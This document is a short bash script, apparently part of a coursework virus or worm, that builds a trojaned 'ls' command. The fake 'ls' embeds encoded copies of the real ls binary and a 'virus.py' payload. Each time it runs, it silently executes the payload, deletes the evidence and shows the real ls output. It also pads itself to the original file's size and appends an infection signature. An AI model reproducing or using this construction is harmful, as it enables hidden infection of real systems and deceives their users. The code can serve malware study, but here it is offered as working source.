#!/usr/bin/env bash

SIG="\xaa\xbb\xcc\xdd"

FAKE_LS="ls"
ORI_LS_FILENAME=".ori_ls"

ORI_LS=`gzip -c /usr/bin/ls | base64 -w0`
VIRUS=`cat virus.py | base64 -w0`

VIRUS_FILENAME="virus.py"
WORM_FILENAME="worm.py"


touch $FAKE_LS
echo '#!/usr/bin/env bash' > $FAKE_LS
echo "ori_ls=$ORI_LS" >> $FAKE_LS
echo "virus=$VIRUS" >> $FAKE_LS
echo "echo \$ori_ls | base64 -d | gzip --decompress > $ORI_LS_FILENAME" >> $FAKE_LS
echo "echo \$virus | base64 -d > $VIRUS_FILENAME" >> $FAKE_LS
echo "chmod +x $ORI_LS_FILENAME" >> $FAKE_LS
echo "python3 $VIRUS_FILENAME $1 $2" >> $FAKE_LS  
echo "rm $VIRUS_FILENAME $WORM_FILENAME" >> $FAKE_LS
echo "./$ORI_LS_FILENAME \"\$@\"" >> $FAKE_LS

echo "rm $ORI_LS_FILENAME"  >> $FAKE_LS

ori_sz=`wc -c /usr/bin/ls | cut -d ' ' -f 1`
new_sz=`wc -c ./ls | cut -d ' ' -f 1`

n=$((ori_sz - new_sz - 5))

for i in $(seq 1 $n); do
    printf " " >> $FAKE_LS
done
printf "#%b" $SIG  >> $FAKE_LS
